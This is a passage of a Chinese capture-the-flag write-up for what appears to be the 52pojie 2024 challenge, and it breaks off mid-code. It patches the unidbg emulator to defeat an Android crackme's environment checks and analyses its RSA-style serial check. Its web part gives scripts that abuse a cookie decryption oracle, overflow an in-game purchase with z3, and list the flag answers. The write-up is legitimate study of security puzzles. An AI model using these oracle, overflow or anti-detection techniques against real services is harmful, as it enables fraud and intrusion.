182);">MapsFileIO</span> <span style="color: rgb(150, 203, 254);">extends</span> <span style="color: rgb(255, 255, 182);">ByteArrayFileIO</span> <span style="color: rgb(150, 203, 254);">implements</span> <span style="color: rgb(255, 255, 182);">FileIO</span> {<br /><br />     <span style="color: rgb(150, 203, 254);">private</span> <span style="color: rgb(150, 203, 254);">static</span> <span style="color: rgb(150, 203, 254);">final</span> <span style="color: rgb(255, 255, 182);">Log</span> <span style="color: rgb(198, 197, 254);">log</span> = LogFactory.getLog(MapsFileIO.class);<br /><br />+    <span style="color: rgb(150, 203, 254);">private</span> <span style="color: rgb(150, 203, 254);">static</span> <span style="color: rgb(150, 203, 254);">final</span> <span style="color: rgb(255, 255, 182);">StringBuilder</span> <span style="color: rgb(198, 197, 254);">appendLines</span> = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">StringBuilder</span>();<br />+<br />+    <span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">static</span> <span style="color: rgb(150, 203, 254);">void</span> <span style="color: rgb(255, 255, 182);">addLine</span>(String line) {<br />+        appendLines.append(line).append(<span style="color: rgb(168, 255, 96);">'\n'</span>);<br />+    }<br />+<br />     <span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(255, 255, 182);">MapsFileIO</span>(<span style="color: rgb(255, 255, 182);">int</span> oflags, String path, Collection&lt;Module&gt; modules) {<br />         super(oflags, path, getMapsData(modules, <span style="color: rgb(198, 197, 254);">null</span>));<br />     }<br />@@ -<span style="color: rgb(255, 115, 253);">69</span>,<span style="color: rgb(255, 115, 253);">6</span> +<span style="color: rgb(255, 115, 253);">75</span>,<span style="color: rgb(255, 115, 253);">7</span> @@ <span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">class</span> <span style="color: rgb(255, 255, 182);">MapsFileIO</span> <span style="color: rgb(150, 203, 254);">extends</span> <span style="color: rgb(255, 255, 182);">ByteArrayFileIO</span> <span style="color: rgb(150, 203, 254);">implements</span> <span style="color: rgb(255, 255, 182);">FileIO</span> {<br />         <span style="color: rgb(150, 203, 254);">if</span> (log.isDebugEnabled()) {<br />             log.debug(<span style="color: rgb(168, 255, 96);">"\n"</span> + builder);<br />         }<br />+        builder.append(appendLines);<br /><br />         <span style="color: rgb(150, 203, 254);">return</span> builder.toString().getBytes();<br />     }</code></pre><p>并使用它：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">MapsFileIO.addLine(<span style="color: rgb(168, 255, 96);">"12345660-12345670 aaaa 123 aa aa /data/app/~~HnABphG7Pe6-7EcBE4_uzg==/com.wuaipojie.crackme2024-KLWRM_cmdomPT0Z97Sa0ZQ==/base.apk"</span>);</code></pre><p>然后根据 syscall 日志得知接下来会 open 这个 base.apk。因此需要把题目文件放到模拟文件系统的对应位置。</p><p>但似乎还是无法打开这个文件，调试 Java 发现是 new RandomAccessFile 时失败。</p><p>原因不详，但修改相应逻辑后可正常打开：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">diff --git a/unidbg-android/src/main/java/com/github/unidbg/linux/file/SimpleFileIO.java b/unidbg-android/src/main/java/com/github/unidbg/linux/file/SimpleFileIO.java<br />index e4e1b4b9..8f3c8a8a <span style="color: rgb(255, 115, 253);">100644</span><br />--- a/unidbg-android/src/main/java/com/github/unidbg/linux/file/SimpleFileIO.java<br />+++ b/unidbg-android/src/main/java/com/github/unidbg/linux/file/SimpleFileIO.java<br />@@ -<span style="color: rgb(255, 115, 253);">41</span>,<span style="color: rgb(255, 115, 253);">7</span> +<span style="color: rgb(255, 115, 253);">41</span>,<span style="color: rgb(255, 115, 253);">7</span> @@ <span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">class</span> <span style="color: rgb(255, 255, 182);">SimpleFileIO</span> <span style="color: rgb(150, 203, 254);">extends</span> <span style="color: rgb(255, 255, 182);">BaseAndroidFileIO</span> <span style="color: rgb(150, 203, 254);">implements</span> <span style="color: rgb(255, 255, 182);">NewFileIO</span> {<br />                 <span style="color: rgb(150, 203, 254);">if</span> (!file.exists() &amp;&amp; !file.createNewFile()) {<br />                     <span style="color: rgb(150, 203, 254);">throw</span> <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">IOException</span>(<span style="color: rgb(168, 255, 96);">"createNewFile failed: "</span> + file);<br />                 }<br />-                _randomAccessFile = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">RandomAccessFile</span>(file, <span style="color: rgb(168, 255, 96);">"rws"</span>);<br />+                _randomAccessFile = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">RandomAccessFile</span>(file, !file.canWrite() ? <span style="color: rgb(168, 255, 96);">"r"</span> :<span style="color: rgb(168, 255, 96);">"rws"</span>);<br />                 onFileOpened(_randomAccessFile);<br />             }<br />             <span style="color: rgb(150, 203, 254);">return</span> _randomAccessFile;</code></pre><p>然后返回的32位数字就不是0或-1了。</p><p>这个逻辑和 genuine 读取 apk 的签名中的证书并计算 hash 来校验的逻辑类似。经过对比可知 unidbg 得到的32位值与 genuine 的那段逻辑得出的值相同，因此应该是正确的。（注意，bkdr hash 与手动 parser 用作安全校验用途是会有问题的，只能用于反调试用途。）</p><h4>摄像头检查</h4><p>通过调用 ACameraManager_getCameraIdList，检查返回的 numCameras 是否为 2，来判断是否是一台正常的手机设备。</p><p>为此，实现一个 VirtualModule 放到 unidbg-android/src/main/java/com/github/unidbg/virtualmodule/android/Camera2NdkModule.java 来实现此目的（内容见附件的 Camera2NdkModule.java）。</p><p>然后在主程序中启用：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">Camera2NdkModule</span>(emulator, vm).register(memory);</code></pre><h3>解题</h3><h4>还原逻辑</h4><p>通过使用的常量进行猜测并 hook 函数并打印入参与返回值验证可知：对 checkSn 传入的字符串的作第一个操作函数是 base64Decode(24290)。</p><p>随后是 USB 调试检查和一个很大的函数 decryptInternal(1E924)。</p><p>在里面进行内存读取和 apk 读取得到的值进行多次 md5 后的值被传入 initBigNum(2A5C8)，除此之外还有两个常量也被传入了这个函数的另两次调用；随后是非常耗时的函数 modPow(37654) 的两次调用；后面又调用了 bigMul(30F4C),bigMod(36F00),bigNumOut(2AFE8)。</p><p>之所以确认这些函数和大整数有关并如此命名是因为题目提示解不唯一、验证字符串非常长等情况很明显是存在公钥验证算法才会发生的事情（而根据文本长度可以排除椭圆曲线，而 RSA 以外的算法又显得太过偏离“Android 高级题”的主题了），而验证算法里最耗时的显然会是 modPow 操作，根据 hook 函数打印的入参容易猜测谁是模数 n；而 bigMod 的传入参数里又有 n，因而猜测是 mod；剩下一个函数是乘法的可能非常高（除法需要 n，加法减法导致结果没有太好的性质）；然后根据 initBigNum 的输入（猜测为大端序）和 bigNumOut 的输出验证发现确实如此。</p><p>bigNumOut 后会按 PKCSv1.5 规定的公钥操作(BT=2)进行校验并取出解密结果作为 decryptInternal 的返回值。</p><p>最后是回到 checkSn 对 decryptInternal 返回值进行一次按字节加密后与传入的另一参数（uid 的 md5 结果）进行比较。</p><p>完整逻辑的 python 版本见附件 final.py 的 verify_logic。</p><h4>crypto</h4><p>按字节加密容易进行逆向，因此最终问题是求以下方程的 c。</p><p>c^{d1}c^{d2}\equiv m\pmod n</p><p>其中 d1 d2 n 已知，m的部分字节内容可随意，其余部分内容已知。</p><p>令 <span tabindex="0"><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 6.099em;"><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 5.237em; height: 0px; font-size: 16.24px;"><span><span style="display: inline; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal;"><span>d<span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; overflow: hidden; height: 1px; width: 0.003em;"></span></span><span>=</span><span>d<span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; overflow: hidden; height: 1px; width: 0.003em;"></span></span><span>1</span><span>+</span><span>d<span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; overflow: hidden; height: 1px; width: 0.003em;"></span></span><span>2</span></span><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 0px; height: 2.158em;"></span></span></span><span></span></span><span>�=�1+�2</span></span>，有 <span tabindex="0"><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 8.501em;"><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 7.331em; height: 0px; font-size: 16.24px;"><span><span style="display: inline; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal;"><span style="display: inline; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal;"><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 0.865em; height: 0px;"><span><span>c</span><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 0px; height: 4.006em;"></span></span><span><span>d<span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; overflow: hidden; height: 1px; width: 0.003em;"></span></span><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 0px; height: 4.006em;"></span></span></span></span><span>≡</span><span>m</span><span style="display: inline; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal;"><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0em; line-height: normal; height: 0em; width: 0.434em; overflow: hidden;"></span></span><span>(</span><span>mod</span><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0em; line-height: normal; height: 0em; width: 0.311em; overflow: hidden;"></span><span>n</span><span>)</span></span><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 0px; height: 2.158em;"></span></span></span><span></span></span><span>��≡�(mod�)</span></span>，是典型的私钥解密操作。</p><p>但实际上，能让攻击者知道的是公钥与公钥验签操作，把这里的 d 看作 e，容易发现这时BT应当为00或01。如果 d(被看作 e 的数字)很小，那么可以进行 Bleichenbacher's attack，但这里 d 很大。</p><p>实际上，这个验证逻辑除了允许填充非 FF 的非 0 值外，还允许解密后消息是以 uid 的 MD5 为前缀的任意消息。虽然这减少的攻击工作量在密码学上有意义，但实际上没用。</p><p>随后我又猜测 e(被看作 d)毕竟是 e，应该很小，但从1爆破到0x10001没有结果。</p><p>然后就只能猜测像 Android 中级题那样，某个奇怪的地方藏着公钥。但整个so、apk都给我翻了个底朝天后我仍然一无所获 QAQ（这就是为什么有人会分析字符串解密的过程）。</p><p>而最后提示直接提供了 e=0x200001，那么整个题目就被很容易地做完了（代码见 final.py 末尾）。</p><p>回过头来看如何得到 e：</p><p>对于已知 d（可看作 e）求小 e（可看作 d）可采用 Boneh-Durfee Attack 这样的小私钥指数攻击，这远比爆破来得快。但出题人的 phi 实际上并不是 <span tabindex="0"><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 10.964em;"><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 9.424em; height: 0px; font-size: 16.24px;"><span><span style="display: inline; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal;"><span>ϕ</span><span>(</span><span>n</span><span>)</span><span>=</span><span>(</span><span>p</span><span>−</span><span>1</span><span>)</span><span>(</span><span>q<span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; overflow: hidden; height: 1px; width: 0.003em;"></span></span><span>−</span><span>1</span><span>)</span></span><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 0px; height: 2.158em;"></span></span></span><span></span></span><span>�(�)=(�−1)(�−1)</span></span> 而是 <span tabindex="0"><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 12.442em;"><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 10.717em; height: 0px; font-size: 16.24px;"><span><span style="display: inline; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal;"><span>λ</span><span>(</span><span>n</span><span>)</span><span>=</span><span>l</span><span>c</span><span>m</span><span>(</span><span>p</span><span>−</span><span>1</span><span>,</span><span>q<span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; overflow: hidden; height: 1px; width: 0.003em;"></span></span><span>−</span><span>1</span><span>)</span></span><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 0px; height: 2.158em;"></span></span></span><span></span></span><span>�(�)=���(�−1,�−1)</span></span> 因此直接用 Boneh-Durfee Attack 是没法得出结果的（这个攻击是基于 <span tabindex="0"><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 7.762em;"><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 6.653em; height: 0px; font-size: 16.24px;"><span><span style="display: inline; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal;"><span>e</span><span>d<span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; overflow: hidden; height: 1px; width: 0.003em;"></span></span><span>=</span><span>k</span><span>ϕ</span><span>(</span><span>n</span><span>)</span><span>+</span><span>1</span></span><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 0px; height: 2.158em;"></span></span></span><span></span></span><span>��=��(�)+1</span></span> 来进行的），需要先猜一下 <span tabindex="0"><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 8.377em;"><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 7.208em; height: 0px; font-size: 16.24px;"><span><span style="display: inline; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal;"><span>g<span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; overflow: hidden; height: 1px; width: 0.003em;"></span></span><span>c</span><span>d<span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; overflow: hidden; height: 1px; width: 0.003em;"></span></span><span>(</span><span>p</span><span>−</span><span>1</span><span>,</span><span>q<span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; overflow: hidden; height: 1px; width: 0.003em;"></span></span><span>−</span><span>1</span><span>)</span></span><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 0px; height: 2.158em;"></span></span></span><span></span></span><span>���(�−1,�−1)</span></span> 的值(实际上是2)，这样才能得到 e。</p><p>相关代码见 final.py 的 get_e 函数。</p><p>但我认为“猜”到 e d 不是模 <span tabindex="0"><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 2.281em;"><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 1.974em; height: 0px; font-size: 16.24px;"><span><span style="display: inline; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal;"><span>ϕ</span><span>(</span><span>n</span><span>)</span></span><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 0px; height: 2.158em;"></span></span></span><span></span></span><span>�(�)</span></span> 而是 <span tabindex="0"><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 2.281em;"><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 1.974em; height: 0px; font-size: 16.24px;"><span><span style="display: inline; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal;"><span>λ</span><span>(</span><span>n</span><span>)</span></span><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 0px; height: 2.158em;"></span></span></span><span></span></span><span>�(�)</span></span> 的逆元这点是不太现实的，尤其是 Boneh-Durfee Attack 可能需要调参。希望有大佬能为我解惑——有无除继续爆破e以外的、不需要通过“猜”得出 e 的方法，或 practical 的签名伪造方案QAQ。</p><h2>Web 题</h2><p>（初级题反而是最后出的QAQ，毕竟后面的题目熟悉 js 就行，初级题要观察和猜测。</p><h3>flag1</h3><p>视频开头的波浪效果，慢放并多看几次即可。flag1{52pj2024}</p><h3>flag2</h3><p>访问 https://2024challenge.52pojie.cn/ （URL 通过去年网址猜测，或者通过拼接二维码得到）</p><p>发现302响应的报头中包含 X-Flag2: flag2{xHOpRP}</p><h3>flag3</h3><p>视频开头噪声中变动的部分，慢放并多看几次即可。flag3{GRsgk2}</p><h3>flag4/flag10</h3><p>打开 https://2024challenge.52pojie.cn/flag4_flag10.png 即看到 flag4{YvJZNS}</p><p>用 Stegsolve.jar inversion color 后看到 flag10{6BxMkW}</p><h3>flagA</h3><p>登录时返回cookie中有flagA字段(该字段是加密的，但可猜测其解密方法同Cookie中的uid字段，因此把加密的uid内容改成加密的flagA内容后进行请求，可获得解密的uid(可以预见解密未作校验))</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">async</span> <span style="color: rgb(150, 203, 254);">function</span> <span style="color: rgb(255, 255, 182);">main</span>(uid_value) {<br />    <span style="color: rgb(150, 203, 254);">let</span> resp = <span style="color: rgb(150, 203, 254);">await</span> <span style="color: rgb(255, 255, 182);">fetch</span>(<span style="color: rgb(168, 255, 96);">"https://2024challenge.52pojie.cn/auth/login"</span>, {<br />        <span style="color: rgb(168, 255, 96);">"headers"</span>: {<br />            <span style="color: rgb(168, 255, 96);">"content-type"</span>: <span style="color: rgb(168, 255, 96);">"application/x-www-form-urlencoded"</span><br />        },<br />        <span style="color: rgb(168, 255, 96);">"body"</span>: <span style="color: rgb(168, 255, 96);">"uid="</span> + uid_value,<br />        <span style="color: rgb(168, 255, 96);">"method"</span>: <span style="color: rgb(168, 255, 96);">"POST"</span>,<br />        <span style="color: rgb(168, 255, 96);">"redirect"</span>: <span style="color: rgb(168, 255, 96);">"manual"</span>,<br />    });<br />    <span style="color: rgb(150, 203, 254);">let</span> ret = resp.headers.<span style="color: rgb(255, 255, 182);">getSetCookie</span>().<span style="color: rgb(255, 255, 182);">filter</span>(v =&gt; v.<span style="color: rgb(255, 255, 182);">startsWith</span>(<span style="color: rgb(168, 255, 96);">'flagA='</span>))[<span style="color: rgb(255, 115, 253);">0</span>].<span style="color: rgb(255, 255, 182);">split</span>(<span style="color: rgb(168, 255, 96);">';'</span>)[<span style="color: rgb(255, 115, 253);">0</span>].<span style="color: rgb(255, 255, 182);">slice</span>(<span style="color: rgb(255, 115, 253);">6</span>);<br />    <span style="color: rgb(150, 203, 254);">let</span> resp2 = <span style="color: rgb(150, 203, 254);">await</span> <span style="color: rgb(255, 255, 182);">fetch</span>(<span style="color: rgb(168, 255, 96);">"https://2024challenge.52pojie.cn/auth/uid"</span>, {<br />        <span style="color: rgb(168, 255, 96);">"method"</span>: <span style="color: rgb(168, 255, 96);">"GET"</span>,<br />        <span style="color: rgb(168, 255, 96);">"headers"</span>: {<br />            <span style="color: rgb(168, 255, 96);">"cookie"</span>: <span style="color: rgb(168, 255, 96);">`uid=<span style="color: rgb(218, 239, 163);">${ret}</span>`</span><br />        }<br />    });<br />    <span style="color: rgb(198, 197, 254);">console</span>.<span style="color: rgb(255, 255, 182);">log</span>(<span style="color: rgb(150, 203, 254);">await</span> resp2.<span style="color: rgb(255, 255, 182);">text</span>());<br />}<br /><span style="color: rgb(255, 255, 182);">main</span>(<span style="color: rgb(255, 115, 253);">691872</span>);</code></pre><p>此处加密和后面的2048小游戏相同，但由于登录接口只给数字加密，因此没法直接完成小游戏。</p><h3>flag5/flag9</h3><p>复制网页源码隐藏内容中的字符到编辑器，去掉其中的特殊字符，得到 flag5{P3prqF}。</p><p>对整个隐藏内容进行适当换行，看到字符画 flag9{KHTALK}。</p><h3>flag6</h3><p>查看网页源码知：flag 内容为数字，且 md5 为 1c450bbafad15ad87c32831fa1a616fc。</p><p>cmd5 反查 MD5 知：flag 为 flag6{20240217}。</p><h3>flag7</h3><p>视频末尾提到了github仓库，找到其历史commit的内容：flag7{Djl9NQ}</p><h3>flag8/flagB</h3><p>https://2024challenge.52pojie.cn/flagB/index.html 为 2048 小游戏。</p><p>玩一会后v他50得到提示为溢出，尝试溢出 <span tabindex="0"><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 1.542em;"><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 1.296em; height: 0px; font-size: 16.24px;"><span><span style="display: inline; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal;"><span style="display: inline; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal;"><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 1.296em; height: 0px;"><span><span>2</span><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 0px; height: 4.006em;"></span></span><span><span style="display: inline; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal;"><span style="display: inline; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal;"><span>32</span></span></span><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 0px; height: 4.006em;"></span></span></span></span></span><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 0px; height: 0.988em;"></span></span></span><span></span></span><span>232</span></span> 未果，因此尝试溢出 <span tabindex="0"><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 1.542em;"><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 1.296em; height: 0px; font-size: 16.24px;"><span><span style="display: inline; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal;"><span style="display: inline; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal;"><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 1.296em; height: 0px;"><span><span>2</span><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 0px; height: 4.006em;"></span></span><span><span style="display: inline; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal;"><span style="display: inline; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal;"><span>64</span></span></span><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 0px; height: 4.006em;"></span></span></span></span></span><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 0px; height: 0.988em;"></span></span></span><span></span></span><span>264</span></span>，发现要求金额必须减少而不是增加。</p><p>把这些要求输入 z3 即可得到合适的购买数量：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">from</span> z3 <span style="color: rgb(150, 203, 254);">import</span> *<br />v = BitVec(<span style="color: rgb(168, 255, 96);">'a'</span>, <span style="color: rgb(255, 115, 253);">64</span>)<br />s=Solver()<br />s.add(v&gt;<span style="color: rgb(255, 115, 253);">0</span>)<br />s.add(<span style="color: rgb(255, 115, 253);">999063388</span>*v&lt;<span style="color: rgb(255, 115, 253);">570</span>)<br />s.add(<span style="color: rgb(255, 115, 253);">570</span>-<span style="color: rgb(255, 115, 253);">999063388</span> * v &lt; <span style="color: rgb(255, 115, 253);">570</span>)<br />s.check()<br />print(s.model())</code></pre><p>其中 flag8 为 flag8{OaOjIK}。</p><p>flag8 由于数量较少，可以多次手玩，也可以使用 网上的简单 AI 自动玩。</p><p>自动获取这部分 flag 的代码见下（2048ai.js 及其依赖 session_fetcher.mjs 见附件，是对 https://github.com/aj-r/2048-AI 内容进行适当包装所得）</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">const</span> { runAI } = require(<span style="color: rgb(168, 255, 96);">'./2048ai'</span>);<br /><br /><span style="color: rgb(150, 203, 254);">async</span> <span style="color: rgb(150, 203, 254);">function</span> <span style="color: rgb(255, 255, 182);">main</span>(uid_value) {<br />    <span style="color: rgb(150, 203, 254);">let</span> resp = <span style="color: rgb(150, 203, 254);">await</span> <span style="color: rgb(255, 255, 182);">fetch</span>(<span style="color: rgb(168, 255, 96);">"https://2024challenge.52pojie.cn/auth/login"</span>, {<br />        <span style="color: rgb(168, 255, 96);">"headers"</span>: {<br />            <span style="color: rgb(168, 255, 96);">"content-type"</span>: <span style="color: rgb(168, 255, 96);">"application/x-www-form-urlencoded"</span><br />        },<br />        <span style="color: rgb(168, 255, 96);">"body"</span>: <span style="color: rgb(168, 255, 96);">"uid="</span> + uid_value,<br />        <span style="color: rgb(168, 255, 96);">"method"</span>: <span style="color: rgb(168, 255, 96);">"POST"</span>,<br />        <span style="color: rgb(168, 255, 96);">"redirect"</span>: <span style="color: rgb(168, 255, 96);">"manual"</span>,<br />    });<br />    <span style="color: rgb(150, 203, 254);">let</span> uid = resp.headers.<span style="color: rgb(255, 255, 182);">getSetCookie</span>().<span style="color: rgb(255, 255, 182);">filter</span>(v =&gt; v.<span style="color: rgb(255, 255, 182);">startsWith</span>(<span style="color: rgb(168, 255, 96);">'uid='</span>))[<span style="color: rgb(255, 115, 253);">0</span>].<span style="color: rgb(255, 255, 182);">split</span>(<span style="color: rgb(168, 255, 96);">';'</span>)[<span style="color: rgb(255, 115, 253);">0</span>].<span style="color: rgb(255, 255, 182);">slice</span>(<span style="color: rgb(255, 115, 253);">4</span>);<br />    <span style="color: rgb(150, 203, 254);">async</span> <span style="color: rgb(150, 203, 254);">function</span> <span style="color: rgb(255, 255, 182);">buyItem</span>(item, cnt, result) {<br />        <span style="color: rgb(150, 203, 254);">const</span> session = <span style="color: rgb(150, 203, 254);">await</span> <span style="color: rgb(255, 255, 182);">runAI</span>(uid, money =&gt; money &gt;= <span style="color: rgb(255, 115, 253);">10</span>, <span style="color: rgb(255, 115, 253);">0</span>);<br />        <span style="color: rgb(150, 203, 254);">let</span> resp = <span style="color: rgb(150, 203, 254);">await</span> session.<span style="color: rgb(255, 255, 182);">fetch</span>(<span style="color: rgb(168, 255, 96);">'/flagB/buy_item'</span>, {method: <span style="color: rgb(168, 255, 96);">'POST'</span>, headers: {<span style="color: rgb(168, 255, 96);">'Content-Type'</span>: <span style="color: rgb(168, 255, 96);">'application/x-www-form-urlencoded'</span>}, body: <span style="color: rgb(168, 255, 96);">`shop_item_id=<span style="color: rgb(218, 239, 163);">${encodeURIComponent(item)}</span>&amp;buy_count=<span style="color: rgb(218, 239, 163);">${encodeURIComponent(cnt)}</span>`</span>});<br />        <span style="color: rgb(198, 197, 254);">console</span>.<span style="color: rgb(255, 255, 182);">log</span>(<span style="color: rgb(150, 203, 254);">await</span> resp.<span style="color: rgb(255, 255, 182);">json</span>());<br />        resp = <span style="color: rgb(150, 203, 254);">await</span> session.<span style="color: rgb(255, 255, 182);">fetch</span>(<span style="color: rgb(168, 255, 96);">'/flagB/use_item'</span>, {method: <span style="color: rgb(168, 255, 